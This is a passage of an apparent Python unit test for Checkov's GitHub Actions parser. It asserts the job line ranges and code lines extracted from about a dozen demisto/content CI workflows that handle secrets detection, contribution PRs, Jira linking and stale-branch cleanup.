            (39, "          pipenv run ./handle_external_pr.py\n"),
            (40, '          echo "Finished Handling External PR"\n'),
            (41, "      - name: Send Notification\n"),
            (42, "        env:\n"),
            (43, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
            (44, "          EVENT_PAYLOAD: ${{ toJson(github.event) }}\n"),
            (45, "          CORTEX_XSOAR_SLACK_TOKEN: ${{ secrets.CORTEX_XSOAR_SLACK_TOKEN }}\n"),
            (46, "        run: |\n"),
            (47, '          echo "Sending notification about External PR ${{ github.event.pull_request.html_url }}"\n'),
            (48, "          cd Utils/github_workflow_scripts\n"),
            (49, "          pipenv run ./send_slack_message.py\n"),
        ],
    }

    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert len(context) == len(defs)
    assert context == {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/run-secrets-detection.yml": {
            "jobs": {
                "secrets_detection": {
                    "start_line": 6,
                    "end_line": 38,
                    "code_lines": [
                        (6, "    runs-on: ubuntu-latest\n"),
                        (
                            7,
                            "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]'\n",
                        ),
                        (8, "    steps:\n"),
                        (9, "      - name: Checkout\n"),
                        (10, "        uses: actions/checkout@v3\n"),
                        (11, "      - name: Setup Python\n"),
                        (12, "        uses: actions/setup-python@v3\n"),
                        (13, "        with:\n"),
                        (14, "          python-version: '3.8'\n"),
                        (15, "      - name: Setup Poetry\n"),
                        (16, "        uses: Gr1N/setup-poetry@v7\n"),
                        (17, "      - name: Install Python Dependencies\n"),
                        (18, "        run: |\n"),
                        (19, "          poetry install --with ci\n"),
                        (20, "      - name: Run Secrets Detection\n"),
                        (21, "        env:\n"),
                        (22, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (23, "          BRANCH_NAME: ${{ github.head_ref }}\n"),
                        (24, "          USERNAME: ${{ secrets.SECRET_CHECK_USER }}\n"),
                        (25, "          PASSWORD: ${{ secrets.SECRET_CHECK_PASS }}\n"),
                        (26, "        run: |\n"),
                        (27, '          echo "Run secrets detection for PR: $PR_NUMBER on branch: $BRANCH_NAME"\n'),
                        (
                            28,
                            "          investigation_id=$(poetry run Utils/github_workflow_scripts/run_secrets_detection.py --pr_number $PR_NUMBER --branch_name $BRANCH_NAME --username $USERNAME --password $PASSWORD)\n",
                        ),
                        (29, '          echo "INVESTIGATION_ID=$investigation_id" >> $GITHUB_ENV\n'),
                        (30, "      - name: Wait For Playbook To Finish\n"),
                        (31, "        env:\n"),
                        (32, "          GOLD_API_KEY: ${{ secrets.SECRETS_GOLD_API_KEY }}\n"),
                        (33, "        run: |\n"),
                        (34, '          echo "Invastigation id is: $INVESTIGATION_ID "\n'),
                        (
                            35,
                            "          poetry run python ./Utils/github_workflow_scripts/run_secrets_detection_get_playbook_status.py -i $INVESTIGATION_ID -k $GOLD_API_KEY\n",
                        ),
                        (36, "\n"),
                        (37, "\n"),
                    ],
                }
            }
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/trigger-contribution-build.yml": {
            "jobs": {
                "trigget_contrib_build": {
                    "start_line": 8,
                    "end_line": 32,
                    "code_lines": [
                        (8, "    runs-on: ubuntu-latest\n"),
                        (
                            9,
                            "    if: github.event.action == 'labeled' && contains(github.event.pull_request.labels.*.name, 'ready-for-instance-test') == true && github.event.pull_request.head.repo.fork == true\n",
                        ),
                        (10, "    steps:\n"),
                        (11, "      - name: Checkout\n"),
                        (12, "        uses: actions/checkout@v3\n"),
                        (13, "      - name: Setup Python\n"),
                        (14, "        uses: actions/setup-python@v3\n"),
                        (15, "        with:\n"),
                        (16, "          python-version: '3.9'\n"),
                        (17, "      - name: Setup Poetry\n"),
                        (18, "        uses: Gr1N/setup-poetry@v7\n"),
                        (19, "      - name: Install Python Dependencies\n"),
                        (20, "        run: |\n"),
                        (21, "          poetry install --with ci\n"),
                        (22, "      - name: Trigger Contribution Build\n"),
                        (23, "        env:\n"),
                        (24, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (25, "          BASE_BRANCH: ${{ github.event.pull_request.base.ref }}\n"),
                        (26, "          CONTRIB_BRANCH: ${{ github.event.pull_request.head.label }}\n"),
                        (27, "          USERNAME: ${{ secrets.TRIGGER_BUILD_USER }}\n"),
                        (28, "          PASSWORD: ${{ secrets.TRIGGER_BUILD_PASSWORD }}\n"),
                        (29, "        run: |\n"),
                        (
                            30,
                            '          echo "Trigger contribution build for PR: $PR_NUMBER with base branch: $BASE_BRANCH contrib branch: $CONTRIB_BRANCH"\n',
                        ),
                        (
                            31,
                            "          poetry run python ./Utils/github_workflow_scripts/trigger_contribution_build.py --pr_number $PR_NUMBER --base_branch $BASE_BRANCH --contrib_branch $CONTRIB_BRANCH --username $USERNAME --password $PASSWORD\n",
                        ),
                    ],
                }
            }
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/review-release-notes.yml": {
            "jobs": {
                "release_notes_review": {
                    "start_line": 6,
                    "end_line": 33,
                    "code_lines": [
                        (6, "    runs-on: ubuntu-latest\n"),
                        (
                            7,
                            "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false\n",
                        ),
                        (8, "    steps:\n"),
                        (9, "      - name: Checkout\n"),
                        (10, "        uses: actions/checkout@v3\n"),
                        (11, "        with:\n"),
                        (12, "          fetch-depth: 2\n"),
                        (13, "      - name: Get changed files\n"),
                        (14, "        id: changed-files\n"),
                        (15, "        uses: tj-actions/changed-files@v18.7\n"),
                        (16, "        with:\n"),
                        (17, "          separator: ';'\n"),
                        (18, "      - name: Setup Python\n"),
                        (19, "        uses: actions/setup-python@v3\n"),
                        (20, "        with:\n"),
                        (21, "          python-version: '3.9'\n"),
                        (22, "      - name: Setup Poetry\n"),
                        (23, "        uses: Gr1N/setup-poetry@v7\n"),
                        (24, "      - name: Install Python Dependencies\n"),
                        (25, "        run: |\n"),
                        (26, "          poetry install --with ci\n"),
                        (27, "      - name: Review Release Notes\n"),
                        (28, "        run: |\n"),
                        (29, '          changed_files="${{ steps.changed-files.outputs.all_changed_files }}"\n'),
                        (30, "          delim=';'\n"),
                        (31, '          echo "Starting docs review"\n'),
                        (
                            32,
                            '          poetry run python Utils/github_workflow_scripts/run_docs_review.py --changed_files "$changed_files" --delimiter $delim\n',
                        ),
                    ],
                }
            }
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/sync-contribution-base-branch.yml": {
            "permissions": {
                "contents": {"start_line": 8, "end_line": 10, "code_lines": [(8, "  contents: read\n"), (9, "\n")]}
            },
            "jobs": {
                "sync_contributor_base_branch": {
                    "start_line": 12,
                    "end_line": 34,
                    "code_lines": [
                        (12, "    runs-on: ubuntu-latest\n"),
                        (13, "    if: github.repository == 'demisto/content'\n"),
                        (14, "    steps:\n"),
                        (15, "      - name: Checkout\n"),
                        (16, "        uses: actions/checkout@v3\n"),
                        (17, "      - name: Setup Python\n"),
                        (18, "        uses: actions/setup-python@v3\n"),
                        (19, "        with:\n"),
                        (20, "          python-version: '3.9'\n"),
                        (21, "      - name: Install Python Dependencies\n"),
                        (22, "        run: |\n"),
                        (23, "          python -m pip install --upgrade pip\n"),
                        (24, "          pip install pipenv==2021.5.29\n"),
                        (25, "      - name: Sync Base Branch to Master\n"),
                        (26, "        env:\n"),
                        (27, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
                        (28, "        run: |\n"),
                        (29, '          echo "Updating contribution base branches (contrib/*)"\n'),
                        (30, "          cd Utils/github_workflow_scripts\n"),
                        (31, "          pipenv sync\n"),
                        (32, "          pipenv run ./sync_contrib_base.py\n"),
                        (33, '          echo "Finished updating base branches"\n'),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/check-contribution-form-filled.yml": {
            "permissions": {
                "pull-requests": {
                    "start_line": 7,
                    "end_line": 9,
                    "code_lines": [(7, "  pull-requests: read\n"), (8, "\n")],
                }
            },
            "jobs": {
                "contribution_form_filled_verification": {
                    "start_line": 11,
                    "end_line": 35,
                    "code_lines": [
                        (11, "    runs-on: ubuntu-latest\n"),
                        (
                            12,
                            "    # This status check only runs for: forked PRS that don't contain the '[Marketplace Contribution]' in their title and the head branch is not a test branch.\n",
                        ),
                        (
                            13,
                            "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false && contains(github.event.pull_request.title, '[Marketplace Contribution]') == false\n",
                        ),
                        (14, "    steps:\n"),
                        (15, "      - name: Checkout\n"),
                        (16, "        uses: actions/checkout@v3\n"),
                        (17, "      - name: Setup Python\n"),
                        (18, "        uses: actions/setup-python@v3\n"),
                        (19, "        with:\n"),
                        (20, "          python-version: '3.9'\n"),
                        (21, "      - name: Install Python Dependencies\n"),
                        (22, "        run: |\n"),
                        (23, "          python -m pip install --upgrade pip\n"),
                        (24, "          pip install pipenv==2021.5.29\n"),
                        (25, "          cd Utils/github_workflow_scripts\n"),
                        (26, "          pipenv sync\n"),
                        (27, "      - name: Check if contribution form needs to be filled\n"),
                        (28, "        env:\n"),
                        (29, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (30, "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"),
                        (31, "        run: |\n"),
                        (32, '          echo "Checking if contribution form needs to be filled for PR: $PR_NUMBER"\n'),
                        (33, "          cd Utils/github_workflow_scripts\n"),
                        (
                            34,
                            "          pipenv run ./check_if_needs_to_fill_contribution_form.py --pr_number $PR_NUMBER --github_token $GITHUB_TOKEN\n",
                        ),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/close_jira_issue_by_pr_merge.yml": {
            "permissions": {
                "pull-requests": {
                    "start_line": 7,
                    "end_line": 9,
                    "code_lines": [(7, "  pull-requests: read\n"), (8, "\n")],
                }
            },
            "jobs": {
                "add_pr_link_to_related_jira_issue": {
                    "start_line": 11,
                    "end_line": 43,
                    "code_lines": [
                        (11, "    runs-on: ubuntu-latest\n"),
                        (
                            12,
                            "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]' && github.event.action == 'closed' && github.event.pull_request.merged == true \n",
                        ),
                        (13, "    steps:\n"),
                        (14, "      - name: Checkout\n"),
                        (15, "        uses: actions/checkout@v3\n"),
                        (16, "      - name: Setup Python\n"),
                        (17, "        uses: actions/setup-python@v3\n"),
                        (18, "        with:\n"),
                        (19, "          python-version: '3.9'\n"),
                        (20, "      - name: Setup Poetry\n"),
                        (21, "        uses: Gr1N/setup-poetry@v7\n"),
                        (22, "      - uses: actions/cache@v2\n"),
                        (23, "        with:\n"),
                        (24, "          path: .venv\n"),
                        (25, "          key: ${{ runner.os }}-poetry-${{ hashFiles('poetry.lock') }}\n"),
                        (26, "      - name: Install Python Dependencies\n"),
                        (27, "        run: |\n"),
                        (28, "          poetry install --with ci\n"),
                        (29, "      - name: Run Linking pr to Jira Script\n"),
                        (30, "        env:\n"),
                        (31, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (32, "          PR_TITLE: ${{ github.event.pull_request.title }}\n"),
                        (33, "          PR_LINK: ${{ github.event.pull_request.html_url }}\n"),
                        (34, "          PR_BODY: ${{ github.event.pull_request.body }}\n"),
                        (35, "          IS_MERGED: True\n"),
                        (36, "          USERNAME: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}\n"),
                        (37, "          PASSWORD: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_PASSWORD }}\n"),
                        (38, "          INSTANCE_URL: ${{ secrets.ENGINE_URL }}\n"),
                        (39, "        run: |\n"),
                        (40, '          echo "Checking for related Jira issues to PR: $PR_NUMBER"\n'),
                        (41, "          cd Utils/github_workflow_scripts/jira_integration_scripts\n"),
                        (
                            42,
                            '          poetry run python ./link_pr_to_jira_issue.py --url "$INSTANCE_URL" --pr_num "$PR_NUMBER" --pr_link "$PR_LINK" --pr_title "$PR_TITLE" --pr_body "$PR_BODY" --is_merged $IS_MERGED --username $USERNAME --password $PASSWORD\n',
                        ),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/project_manager_hourly.yml": {
            "permissions": {
                "contents": {"start_line": 6, "end_line": 8, "code_lines": [(6, "  contents: read\n"), (7, "\n")]}
            },
            "jobs": {
                "manage_project_board": {
                    "start_line": 10,
                    "end_line": 27,
                    "code_lines": [
                        (10, "    runs-on: ubuntu-latest\n"),
                        (11, "    if: github.repository == 'demisto/content'\n"),
                        (12, "    steps:\n"),
                        (13, "      - uses: actions/checkout@v3\n"),
                        (14, "      - name: Set up Python 3.7\n"),
                        (15, "        uses: actions/setup-python@v3\n"),
                        (16, "        with:\n"),
                        (17, "          python-version: '3.7'\n"),
                        (18, "      - name: Get project manager\n"),
                        (19, "        run: |\n"),
                        (20, "          pip install --upgrade pip\n"),
                        (21, "          pip install github-automation\n"),
                        (22, "      - name: Manage project\n"),
                        (23, "        run: |\n"),
                        (24, "          github-automation manage -c .github/project_conf/contributions.ini\n"),
                        (25, "        env:\n"),
                        (26, "          GITHUB_TOKEN: ${{ secrets.CONTENTBOT_BOARD_UPDATE_TOKEN }}\n"),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/create-internal-pr-from-external.yml": {
            "jobs": {
                "create_internal_pr": {
                    "start_line": 10,
                    "end_line": 40,
                    "code_lines": [
                        (10, "    runs-on: ubuntu-latest\n"),
                        (
                            11,
                            "    if: github.repository == 'demisto/content' && github.event.action == 'closed' && github.event.pull_request.merged == true && github.event.pull_request.head.repo.fork == true\n",
                        ),
                        (12, "    steps:\n"),
                        (13, "      - name: Checkout\n"),
                        (14, "        uses: actions/checkout@v3\n"),
                        (15, "      - name: Setup Python\n"),
                        (16, "        uses: actions/setup-python@v3\n"),
                        (17, "        with:\n"),
                        (18, "          python-version: '3.9'\n"),
                        (19, "\n"),
                        (20, "      - name: Print Context\n"),
                        (21, "        run: |\n"),
                        (22, '          echo "$GITHUB_CONTEXT"\n'),
                        (23, "        env:\n"),
                        (24, "          GITHUB_CONTEXT: ${{ toJson(github) }}\n"),
                        (25, "\n"),
                        (26, "      - name: Install Python Dependencies\n"),
                        (27, "        run: |\n"),
                        (28, "          python -m pip install --upgrade pip\n"),
                        (29, "          pip install pipenv==2021.5.29\n"),
                        (30, "      - name: Create Internal PR\n"),
                        (31, "        env:\n"),
                        (32, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
                        (33, "          EVENT_PAYLOAD: ${{ toJson(github.event) }}\n"),
                        (34, "        run: |\n"),
                        (
                            35,
                            '          echo "Creating an internal PR from original merged external PR ${{ github.event.pull_request.html_url }}"\n',
                        ),
                        (36, "          cd Utils/github_workflow_scripts\n"),
                        (37, "          pipenv sync\n"),
                        (38, "          pipenv run ./create_internal_pr.py\n"),
                        (39, '          echo "Finished Creating Internal PR"\n'),
                    ],
                }
            }
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/sync-contribution-base-branch-on-change.yml": {
            "permissions": {
                "contents": {"start_line": 11, "end_line": 13, "code_lines": [(11, "  contents: read\n"), (12, "\n")]}
            },
            "jobs": {
                "sync_contributor_base_branch": {
                    "start_line": 15,
                    "end_line": 37,
                    "code_lines": [
                        (15, "    runs-on: ubuntu-latest\n"),
                        (
                            16,
                            "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false\n",
                        ),
                        (17, "    steps:\n"),
                        (18, "      - name: Checkout\n"),
                        (19, "        uses: actions/checkout@v3\n"),
                        (20, "      - name: Setup Python\n"),
                        (21, "        uses: actions/setup-python@v3\n"),
                        (22, "        with:\n"),
                        (23, "          python-version: '3.9'\n"),
                        (24, "      - name: Install Python Dependencies\n"),
                        (25, "        run: |\n"),
                        (26, "          python -m pip install --upgrade pip\n"),
                        (27, "          pip install pipenv==2021.5.29\n"),
                        (28, "      - name: Sync Base Branch to Master\n"),
                        (29, "        env:\n"),
                        (30, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
                        (31, "        run: |\n"),
                        (32, '          echo "Updating contribution base branch (contrib/*)"\n'),
                        (33, "          cd Utils/github_workflow_scripts\n"),
                        (34, "          pipenv sync\n"),
                        (
                            35,
                            "          pipenv run ./sync_contrib_base.py --branch_name ${{ github.event.pull_request.base.ref }}\n",
                        ),
                        (36, '          echo "Finished updating base branch"\n'),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/link_edited_pr_to_jira_issue.yml": {
            "permissions": {
                "pull-requests": {
                    "start_line": 7,
                    "end_line": 9,
                    "code_lines": [(7, "  pull-requests: read\n"), (8, "\n")],
                }
            },
            "jobs": {
                "add_pr_link_to_related_jira_issue": {
                    "start_line": 11,
                    "end_line": 44,
                    "code_lines": [
                        (11, "    runs-on: ubuntu-latest\n"),
                        (
                            12,
                            "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]'\n",
                        ),
                        (13, "    steps:\n"),
                        (14, "      - name: Checkout\n"),
                        (15, "        uses: actions/checkout@v3\n"),
                        (16, "      - name: Setup Python\n"),
                        (17, "        uses: actions/setup-python@v3\n"),
                        (18, "        with:\n"),
                        (19, "          python-version: '3.9'\n"),
                        (20, "      - name: Setup Poetry\n"),
                        (21, "        uses: Gr1N/setup-poetry@v7\n"),
                        (22, "      - uses: actions/cache@v2\n"),
                        (23, "        with:\n"),
                        (24, "          path: .venv\n"),
                        (25, "          key: ${{ runner.os }}-poetry-${{ hashFiles('poetry.lock') }}\n"),
                        (26, "      - name: Install Python Dependencies\n"),
                        (27, "        run: |\n"),
                        (28, "          poetry install --with ci\n"),
                        (29, "      - name: Run Linking pr to Jira Script\n"),
                        (30, "        env:\n"),
                        (31, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (32, "          PR_TITLE: ${{ github.event.pull_request.title }}\n"),
                        (33, "          PR_LINK: ${{ github.event.pull_request.html_url }}\n"),
                        (34, "          PR_BODY: ${{ github.event.pull_request.body }}\n"),
                        (35, "          IS_MERGED: false\n"),
                        (36, "          USERNAME: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}\n"),
                        (37, "          PASSWORD: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_PASSWORD }}\n"),
                        (38, "          INSTANCE_URL: ${{ secrets.ENGINE_URL }}\n"),
                        (39, "        run: |\n"),
                        (40, '          echo "Checking for related Jira issues to PR: $PR_NUMBER"\n'),
                        (41, "          cd Utils/github_workflow_scripts/jira_integration_scripts\n"),
                        (
                            42,
                            "          echo --pr_num $PR_NUMBER --pr_link $PR_LINK --pr_title $PR_TITLE --pr_body $PR_BODY --is_merged $IS_MERGED\n",
                        ),
                        (
                            43,
                            '          poetry run python ./link_pr_to_jira_issue.py --url "$INSTANCE_URL" --pr_num "$PR_NUMBER" --pr_link "$PR_LINK" --pr_title "$PR_TITLE" --pr_body "$PR_BODY" --is_merged $IS_MERGED --username $USERNAME --password $PASSWORD\n',
                        ),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/check-contributor-pack.yml": {
            "permissions": {
                "pull-requests": {
                    "start_line": 8,
                    "end_line": 10,
                    "code_lines": [(8, "  pull-requests: write\n"), (9, "\n")],
                }
            },
            "jobs": {
                "check_contributor_pack": {
                    "start_line": 12,
                    "end_line": 39,
                    "code_lines": [
                        (12, "    runs-on: ubuntu-latest\n"),
                        (
                            13,
                            "    if: github.repository == 'demisto/content' && startsWith(github.head_ref, 'contrib/') == false && startsWith(github.head_ref, 'to-merge/') == false && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false && github.event.pull_request.head.repo.fork == false\n",
                        ),
                        (14, "    steps:\n"),
                        (15, "      - name: Checkout\n"),
                        (16, "        uses: actions/checkout@v3\n"),
                        (17, "      - name: Setup Python\n"),
                        (18, "        uses: actions/setup-python@v3\n"),
                        (19, "        with:\n"),
                        (20, "          python-version: '3.8'\n"),
                        (21, "      - name: Setup Poetry\n"),
                        (22, "        uses: Gr1N/setup-poetry@v7\n"),
                        (23, "      - name: Install python dependencies\n"),
                        (24, "        run: |\n"),
                        (25, "          poetry install --with ci\n"),
                        (26, "      - name: Check pack and request review\n"),
                        (27, "        env:\n"),
                        (28, "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"),
                        (29, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (30, "          BRANCH_NAME: ${{ github.head_ref }}\n"),
                        (31, "          SENDGRID_EMAIL_API_KEY: ${{ secrets.SENDGRID_EMAIL_API_KEY }}\n"),
                        (32, "        if: env.SENDGRID_EMAIL_API_KEY\n"),
                        (33, "        run: |\n"),
                        (34, '          echo "PR number is: $PR_NUMBER"\n'),
                        (35, '          echo "Target branch name is: $BRANCH_NAME"\n'),
                        (36, '          echo "Starting check of contributor packs"\n'),
                        (
                            37,
                            "          poetry run python ./Utils/request_contributor_review.py --pr_number $PR_NUMBER --github_token $GITHUB_TOKEN --email_api_token $SENDGRID_EMAIL_API_KEY\n",
                        ),
                        (38, '          echo "Finished check of contributor packs"\n'),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/project_manager_daily.yml": {
            "permissions": {
                "contents": {"start_line": 6, "end_line": 8, "code_lines": [(6, "  contents: read\n"), (7, "\n")]}
            },
            "jobs": {
                "manage_project_board": {
                    "start_line": 10,
                    "end_line": 27,
                    "code_lines": [
                        (10, "    runs-on: ubuntu-latest\n"),
                        (11, "    if: github.repository == 'demisto/content'\n"),
                        (12, "    steps:\n"),
                        (13, "      - uses: actions/checkout@v3\n"),
                        (14, "      - name: Set up Python 3.7\n"),
                        (15, "        uses: actions/setup-python@v3\n"),
                        (16, "        with:\n"),
                        (17, "          python-version: '3.7'\n"),
                        (18, "      - name: Get project manager\n"),
                        (19, "        run: |\n"),
                        (20, "          pip install --upgrade pip\n"),
                        (21, "          pip install github-automation\n"),
                        (22, "      - name: Manage project\n"),
                        (23, "        run: |\n"),
                        (24, "          github-automation manage -c .github/project_conf/contributions.ini\n"),
                        (25, "        env:\n"),
                        (26, "          GITHUB_TOKEN: ${{ secrets.CONTENTBOT_BOARD_UPDATE_TOKEN }}\n"),
                    ],
                }
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/handle-stale-branches.yml": {
            "permissions": {
                "contents": {"start_line": 7, "end_line": 9, "code_lines": [(7, "  contents: read\n"), (8, "\n")]}
            },
            "jobs": {
                "handle_contributor_stale_branches": {
                    "start_line": 11,
                    "end_line": 34,
                    "code_lines": [
                        (11, "    runs-on: ubuntu-latest\n"),
                        (12, "    if: github.repository == 'demisto/content'\n"),
                        (13, "    steps:\n"),
                        (14, "      - name: Checkout\n"),
                        (15, "        uses: actions/checkout@v3\n"),
                        (16, "      - name: Setup Python\n"),
                        (17, "        uses: actions/setup-python@v3\n"),
                        (18, "        with:\n"),
                        (19, "          python-version: '3.9'\n"),
                        (20, "      - name: Install Python Dependencies\n"),
                        (21, "        run: |\n"),
                        (22, "          python -m pip install --upgrade pip\n"),
                        (23, "          pip install pipenv==2021.5.29\n"),
                        (24, "      - name: Delete Stale Contributor Branches\n"),
                        (25, "        env:\n"),
                        (26, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
                        (27, "        run: |\n"),
                        (28, '          echo "Deleting stale contribution base branches (contrib/*)"\n'),
                        (29, "          cd Utils/github_workflow_scripts\n"),
                        (30, "          pipenv sync\n"),
                        (31, "          pipenv run ./delete_stale_contrib_branches.py\n"),
                        (32, '          echo "Finished deleting stale branches"\n'),
                        (33, "\n"),
                    ],
                },
                "handle_stale_non_contributor_branches": {
                    "start_line": 35,
                    "end_line": 57,
                    "code_lines": [
                        (35, "    runs-on: ubuntu-latest\n"),
                        (36, "    if: github.repository == 'demisto/content'\n"),
                        (37, "    steps:\n"),
                        (38, "      - name: Checkout\n"),
                        (39, "        uses: actions/checkout@v3\n"),
                        (40, "      - name: Setup Python\n"),
                        (41, "        uses: actions/setup-python@v3\n"),
                        (42, "        with:\n"),
                        (43, "          python-version: '3.9'\n"),
                        (44, "      - name: Install Python Dependencies\n"),
                        (45, "        run: |\n"),
                        (46, "          python -m pip install --upgrade pip\n"),
                        (47, "          pip install pipenv==2021.5.29\n"),
                        (48, "      - name: Delete Stale Non Contributor Branches\n"),
                        (49, "        env:\n"),
                        (50, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
                        (51, "        run: |\n"),
                        (52, '          echo "Deleting stale non contribution branches"\n'),
                        (53, "          cd Utils/github_workflow_scripts\n"),
                        (54, "          pipenv sync\n"),
                        (55, "          pipenv run ./delete_stale_non_contrib_branches.py\n"),
                        (56, '          echo "Finished deleting stale branches"\n'),
                    ],
                },
            },
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/handle-new-external-pr.yml": {
            "permissions": {
                "contents": {"start_line": 7, "end_line": 9, "code_lines": [(7, "  contents: read\n"), (8, "\n")]}
            },
            "jobs": {
                "handle_new_external_pr": {
                    "start_line": 11,
                    "end_line": 50,
                    "code_lines": [
                        (11, "    runs-on: ubuntu-latest\n"),
                        (
                            12,
                            "    if: github.repository == 'demisto/content' && github.event.action == 'opened' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false\n",
                        ),
                        (13, "    steps:\n"),
                        (14, "      - name: Checkout\n"),
                        (15, "        uses: actions/checkout@v3\n"),
                        (16, "      - name: Setup Python\n"),
                        (17, "        uses: actions/setup-python@v3\n"),
                        (18, "        with:\n"),
                        (19, "          python-version: '3.9'\n"),
                        (20, "\n"),
                        (21, "      - name: Print Context\n"),
                        (22, "        run: |\n"),
                        (23, '          echo "$GITHUB_CONTEXT"\n'),
                        (24, "        env:\n"),
                        (25, "          GITHUB_CONTEXT: ${{ toJson(github) }}\n"),
                        (26, "\n"),
                        (27, "      - name: Install Python Dependencies\n"),
                        (28, "        run: |\n"),
                        (29, "          python -m pip install --upgrade pip\n"),
                        (30, "          pip install pipenv==2021.5.29\n"),
                        (31, "      - name: Update External PR\n"),
                        (32, "        env:\n"),
                        (33, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
                        (34, "          EVENT_PAYLOAD: ${{ toJson(github.event) }}\n"),
                        (35, "        run: |\n"),
                        (36, '          echo "Updating External PR ${{ github.event.pull_request.html_url }}"\n'),
                        (37, "          cd Utils/github_workflow_scripts\n"),
                        (38, "          pipenv sync\n"),
                        (39, "          pipenv run ./handle_external_pr.py\n"),
                        (40, '          echo "Finished Handling External PR"\n'),
                        (41, "      - name: Send Notification\n"),
                        (42, "        env:\n"),
                        (43, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
                        (44, "          EVENT_PAYLOAD: ${{ toJson(github.event) }}\n"),
                        (45, "          CORTEX_XSOAR_SLACK_TOKEN: ${{ secrets.CORTEX_XSOAR_SLACK_TOKEN }}\n"),
                        (46, "        run: |\n"),
                        (
                            47,
                            '          echo "Sending notification about External PR ${{ github.event.pull_request.html_url }}"\n',
                        ),
                        (48, "          cd Utils/github_workflow_scripts\n"),
                        (49, "          pipenv run ./send_slack_message.py\n"),
                    ],
                }
            },
        },
    }
